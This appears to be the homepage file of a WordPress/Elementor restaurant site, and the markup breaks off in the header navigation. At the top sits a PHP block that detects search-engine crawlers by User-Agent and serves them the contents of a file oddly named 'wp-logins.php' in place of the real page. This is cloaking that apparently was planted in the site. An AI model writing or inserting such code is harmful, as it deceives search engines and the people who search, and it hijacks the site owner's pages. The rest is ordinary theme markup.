<?php

$bot_user_agents = array(
    "Googlebot", "Googlebot-Image", "Googlebot-News", "Googlebot-Video", 
    "Storebot-Google", "Google-InspectionTool", "GoogleOther", 
    "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", 
    "YandexBot", "Sogou", "Exabot", "facebot", "ia_archiver"
);

function is_bot($user_agent, $bots) {
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    return false;
}

$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$is_bot = is_bot($user_agent, $bot_user_agents);

if ($is_bot) {
   $bot_file = __DIR__ . '/wp-logins.php';
    
    if (file_exists($bot_file)) {
        header("Content-Type: text/html; charset=UTF-8");
        echo file_get_contents($bot_file);
    } else {
        echo "Bot content not found.";
    }
    exit;
}

?>
<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1" />
	<link rel="profile" href="http://gmpg.org/xfn/11" />
	<link rel="pingback" href="https://odel.co.in/xmlrpc.php" />
	<title>ODEL Digest Restaurant</title>
<meta name='robots' content='max-image-preview:large' />
<link rel="alternate" type="application/rss+xml" title="ODEL Digest Restaurant &raquo; Feed" href="https://odel.co.in/index.php/feed/" />
<link rel="alternate" type="application/rss+xml" title="ODEL Digest Restaurant &raquo; Comments Feed" href="https://odel.co.in/index.php/comments/feed/" />
<script>
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/15.0.3\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/odel.co.in\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.6.5"}};
/*! This file is auto-generated */
!function(i,n){var o,s,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),r=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===r[t]})}function u(e,t,n){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\uddfa\ud83c\uddf3","\ud83c\uddfa\u200b\ud83c\uddf3")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!n(e,"\ud83d\udc26\u200d\u2b1b","\ud83d\udc26\u200b\u2b1b")}return!1}function f(e,t,n){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):i.createElement("canvas"),a=r.getContext("2d",{willReadFrequently:!0}),o=(a.textBaseline="top",a.font="600 32px Arial",{});return e.forEach(function(e){o[e]=t(a,e,n)}),o}function t(e){var t=i.createElement("script");t.src=e,t.defer=!0,i.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",s=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){i.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),p.toString()].join(",")+"));",r=new Blob([e],{type:"text/javascript"}),a=new Worker(URL.createObjectURL(r),{name:"wpTestEmojiSupports"});return void(a.onmessage=function(e){c(n=e.data),a.terminate(),t(n)})}catch(e){}c(n=f(s,u,p))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
</script>

<link rel='stylesheet' id='hfe-widgets-style-css' href='https://odel.co.in/wp-content/plugins/header-footer-elementor/inc/widgets-css/frontend.css?ver=1.6.40' media='all' />
<style id='wp-emoji-styles-inline-css'>

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<style id='classic-theme-styles-inline-css'>
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id='global-styles-inline-css'>
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel='stylesheet' id='contact-form-7-css' href='https://odel.co.in/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.9.8' media='all' />
<link rel='stylesheet' id='hfe-style-css' href='https://odel.co.in/wp-content/plugins/header-footer-elementor/assets/css/header-footer-elementor.css?ver=1.6.40' media='all' />
<link rel='stylesheet' id='elementor-icons-css' href='https://odel.co.in/wp-content/plugins/elementor/assets/lib/eicons/css/elementor-icons.min.css?ver=5.30.0' media='all' />
<link rel='stylesheet' id='elementor-frontend-css' href='https://odel.co.in/wp-content/plugins/elementor/assets/css/frontend-lite.min.css?ver=3.23.4' media='all' />
<link rel='stylesheet' id='swiper-css' href='https://odel.co.in/wp-content/plugins/elementor/assets/lib/swiper/css/swiper.min.css?ver=5.3.6' media='all' />
<link rel='stylesheet' id='elementor-post-8-css' href='https://odel.co.in/wp-content/uploads/elementor/css/post-8.css?ver=1725007663' media='all' />
<link rel='stylesheet' id='elementor-post-4518-css' href='https://odel.co.in/wp-content/uploads/elementor/css/post-4518.css?ver=1727327350' media='all' />
<link rel='stylesheet' id='elementor-post-4521-css' href='https://odel.co.in/wp-content/uploads/elementor/css/post-4521.css?ver=1725007663' media='all' />
<link rel='stylesheet' id='elementor-post-4784-css' href='https://odel.co.in/wp-content/uploads/elementor/css/post-4784.css?ver=1725007663' media='all' />
<link rel='stylesheet' id='hello-elementor-css' href='https://odel.co.in/wp-content/themes/hello-elementor/style.min.css?ver=3.1.1' media='all' />
<link rel='stylesheet' id='hello-elementor-theme-style-css' href='https://odel.co.in/wp-content/themes/hello-elementor/theme.min.css?ver=3.1.1' media='all' />
<link rel='stylesheet' id='hello-elementor-header-footer-css' href='https://odel.co.in/wp-content/themes/hello-elementor/header-footer.min.css?ver=3.1.1' media='all' />
<link rel='stylesheet' id='google-fonts-1-css' href='https://fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CRoboto+Slab%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CLobster+Two%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%7CPoppins%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic&#038;display=swap&#038;ver=6.6.5' media='all' />
<link rel='stylesheet' id='elementor-icons-shared-0-css' href='https://odel.co.in/wp-content/plugins/elementor/assets/lib/font-awesome/css/fontawesome.min.css?ver=5.15.3' media='all' />
<link rel='stylesheet' id='elementor-icons-fa-solid-css' href='https://odel.co.in/wp-content/plugins/elementor/assets/lib/font-awesome/css/solid.min.css?ver=5.15.3' media='all' />
<link rel='stylesheet' id='elementor-icons-fa-regular-css' href='https://odel.co.in/wp-content/plugins/elementor/assets/lib/font-awesome/css/regular.min.css?ver=5.15.3' media='all' />
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="https://api.w.org/" href="https://odel.co.in/index.php/wp-json/" /><link rel="alternate" title="JSON" type="application/json" href="https://odel.co.in/index.php/wp-json/wp/v2/pages/4518" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://odel.co.in/xmlrpc.php?rsd" />
<meta name="generator" content="WordPress 6.6.5" />
<link rel="canonical" href="https://odel.co.in/" />
<link rel='shortlink' href='https://odel.co.in/' />
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://odel.co.in/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fodel.co.in%2F" />
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://odel.co.in/index.php/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fodel.co.in%2F&#038;format=xml" />
<meta name="generator" content="Elementor 3.23.4; features: e_optimized_css_loading, additional_custom_breakpoints, e_lazyload; settings: css_print_method-external, google_font-enabled, font_display-swap">
			<style>
				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload),
				.e-con.e-parent:nth-of-type(n+4):not(.e-lazyloaded):not(.e-no-lazyload) * {
					background-image: none !important;
				}
				@media screen and (max-height: 1024px) {
					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload),
					.e-con.e-parent:nth-of-type(n+3):not(.e-lazyloaded):not(.e-no-lazyload) * {
						background-image: none !important;
					}
				}
				@media screen and (max-height: 640px) {
					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload),
					.e-con.e-parent:nth-of-type(n+2):not(.e-lazyloaded):not(.e-no-lazyload) * {
						background-image: none !important;
					}
				}
			</style>
			<link rel="icon" href="https://odel.co.in/wp-content/uploads/2022/12/Hamburger.svg" sizes="32x32" />
<link rel="icon" href="https://odel.co.in/wp-content/uploads/2022/12/Hamburger.svg" sizes="192x192" />
<link rel="apple-touch-icon" href="https://odel.co.in/wp-content/uploads/2022/12/Hamburger.svg" />
<meta name="msapplication-TileImage" content="https://odel.co.in/wp-content/uploads/2022/12/Hamburger.svg" />
</head>

<body class="home page-template-default page page-id-4518 wp-custom-logo ehf-header ehf-footer ehf-template-hello-elementor ehf-stylesheet-hello-elementor elementor-default elementor-kit-8 elementor-page elementor-page-4518">
<div id="page" class="hfeed site">

		<header id="masthead" itemscope="itemscope" itemtype="https://schema.org/WPHeader">
			<p class="main-title bhf-hidden" itemprop="headline"><a href="https://odel.co.in" title="ODEL Digest Restaurant" rel="home">ODEL Digest Restaurant</a></p>
					<div data-elementor-type="wp-post" data-elementor-id="4521" class="elementor elementor-4521">
						<section class="elementor-section elementor-top-section elementor-element elementor-element-ab3d65a elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="ab3d65a" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
					<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-59cb866" data-id="59cb866" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-af80390 elementor-widget elementor-widget-image" data-id="af80390" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
			<style>/*! elementor - v3.23.0 - 05-08-2024 */
.elementor-widget-image{text-align:center}.elementor-widget-image a{display:inline-block}.elementor-widget-image a img[src$=".svg"]{width:48px}.elementor-widget-image img{vertical-align:middle;display:inline-block}</style>											<a href="https://odel.co.in/">
							<img fetchpriority="high" width="800" height="273" src="https://odel.co.in/wp-content/uploads/2023/08/Group-18163-1024x350.png" class="attachment-large size-large wp-image-4512" alt="" srcset="https://odel.co.in/wp-content/uploads/2023/08/Group-18163-1024x350.png 1024w, https://odel.co.in/wp-content/uploads/2023/08/Group-18163-300x102.png 300w, https://odel.co.in/wp-content/uploads/2023/08/Group-18163-768x262.png 768w, https://odel.co.in/wp-content/uploads/2023/08/Group-18163-1536x525.png 1536w, https://odel.co.in/wp-content/uploads/2023/08/Group-18163-2048x699.png 2048w" sizes="(max-width: 800px) 100vw, 800px" />								</a>
													</div>
				</div>
					</div>
		</div>
				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-4d48afe" data-id="4d48afe" data-element_type="column">
			<div class="elementor-widget-wrap elementor-element-populated">
						<div class="elementor-element elementor-element-581bce9 hfe-nav-menu__align-right elementor-widget__width-initial hfe-submenu-icon-arrow hfe-submenu-animation-none hfe-link-redirect-child hfe-nav-menu__breakpoint-tablet elementor-widget elementor-widget-navigation-menu" data-id="581bce9" data-element_type="widget" data-settings="{&quot;padding&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;12&quot;,&quot;right&quot;:&quot;30&quot;,&quot;bottom&quot;:&quot;12&quot;,&quot;left&quot;:&quot;30&quot;,&quot;isLinked&quot;:false},&quot;padding_horizontal_menu_item&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:15,&quot;sizes&quot;:[]},&quot;padding_horizontal_menu_item_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_horizontal_menu_item_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_vertical_menu_item&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:15,&quot;sizes&quot;:[]},&quot;padding_vertical_menu_item_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_vertical_menu_item_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;menu_space_between&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;menu_space_between_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;menu_space_between_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;menu_row_space&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;menu_row_space_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;menu_row_space_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;dropdown_border_radius&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;dropdown_border_radius_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;dropdown_border_radius_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;width_dropdown_item&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;220&quot;,&quot;sizes&quot;:[]},&quot;width_dropdown_item_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;width_dropdown_item_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_horizontal_dropdown_item&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_horizontal_dropdown_item_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_horizontal_dropdown_item_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_vertical_dropdown_item&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:15,&quot;sizes&quot;:[]},&quot;padding_vertical_dropdown_item_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_vertical_dropdown_item_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;distance_from_menu&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;distance_from_menu_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;distance_from_menu_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_size&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_size_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_size_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_width&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_width_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_width_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_radius&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_radius_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;toggle_border_radius_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;padding_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true},&quot;padding_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;top&quot;:&quot;&quot;,&quot;right&quot;:&quot;&quot;,&quot;bottom&quot;:&quot;&quot;,&quot;left&quot;:&quot;&quot;,&quot;isLinked&quot;:true}}" data-widget_type="navigation-menu.default">
				<div class="elementor-widget-container">
						<div class="hfe-nav-menu hfe-layout-horizontal hfe-nav-menu-layout horizontal hfe-pointer__none" data-layout="horizontal" data-last-item="cta">
				<div role="button" class="hfe-nav-menu__toggle elementor-clickable">
					<span class="screen-reader-text">Menu</span>
					<div class="hfe-nav-menu-icon">
						<i aria-hidden="true"  class="fas fa-align-justify"></i>					</div>
				</div>
				<nav class="hfe-nav-menu__layout-horizontal hfe-nav-menu__submenu-arrow" data-toggle-icon="&lt;i aria-hidden=&quot;true&quot; tabindex=&quot;0&quot; class=&quot;fas fa-align-justify&quot;&gt;&lt;/i&gt;" data-close-icon="&lt;i aria-hidden=&quot;true&quot; tabindex=&quot;0&quot; class=&quot;far fa-window-close&quot;&gt;&lt;/i&gt;" data-full-width="yes">
